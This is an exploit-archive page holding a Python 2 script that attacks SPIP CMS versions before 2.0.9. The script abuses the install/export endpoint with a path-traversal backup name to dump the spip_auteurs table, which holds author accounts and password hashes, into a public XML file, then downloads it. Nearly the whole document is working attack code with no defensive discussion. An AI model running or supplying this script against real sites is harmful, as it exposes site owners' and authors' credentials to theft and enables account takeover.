<html><head><title>SPIP < 2.0.9 Arbitrary Copy All Passwords to XML File Remote Exploit</title></head><pre>#!/usr/bin/env python
# SPIP - Content Management System &lt; 2.0.9 exploit
# http://www.securityfocus.com/bid/36008
# Author : Kernel_Panik
#

import urllib, urllib2
import cookielib
import sys

def send_request(urlOpener, url, post_data=None):
   request = urllib2.Request(url)
   url = urlOpener.open(request, post_data)
   return url.read()

def extract_hash(formulaire):
   return formulaire.split(&quot;&lt;input name='hash' type='hidden' value='&quot;)[1].split(&quot;'&quot;)[0]


if len(sys.argv) &lt; 3:
   print &quot;SPIP &lt; 2.0.9 exploit by Kernel_Panik\n\tUsage: python script.py &lt;Base_url&gt; &lt;filename&gt;&quot;
   exit()

filename = sys.argv[2]
base_url = sys.argv[1]

cookiejar = cookielib.CookieJar()
urlOpener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookiejar))


formulaire = send_request(urlOpener, base_url+&quot;ecrire/?exec=install&amp;reinstall=non&amp;transformer_xml=export_all&amp;nom_sauvegarde=../../../IMG/&quot;+filename)
print &quot;[+] First request sended...&quot;

formulaire_data = {'action' : 'export_all',
                   'export[]' : 'spip_auteurs',
                   'hash' : extract_hash(formulaire),
                   'arg' : 'start,,../../../IMG/'+filename+'.xml,0,1.3'
                  }
formulaire_data = urllib.urlencode(formulaire_data)


send_request(urlOpener, base_url+&quot;spip.php&quot;, formulaire_data)
print &quot;[+] Formulaire content sended&quot;


send_request(urlOpener, base_url+&quot;ecrire/?exec=install&amp;reinstall=non&amp;transformer_xml=export_all&amp;nom_sauvegarde=../../../IMG/&quot;+filename)
print &quot;[+] Second request sended&quot;


send_request(urlOpener, base_url+&quot;ecrire/?exec=install&amp;reinstall=non&amp;transformer_xml=export_all&amp;nom_sauvegarde=../../../IMG/&quot;+filename)
print &quot;[+] Last request sended&quot;

xml_content = send_request(urlOpener, base_url+&quot;IMG/&quot;+filename+&quot;.xml&quot;)
print &quot;[+] Xml file obtained&quot;


result = open(filename+&quot;.xml&quot;, &quot;w&quot;)
result.write(xml_content)
result.close()
print &quot;[+] File saved &quot;

# milw0rm.com [2009-08-18]</pre></html>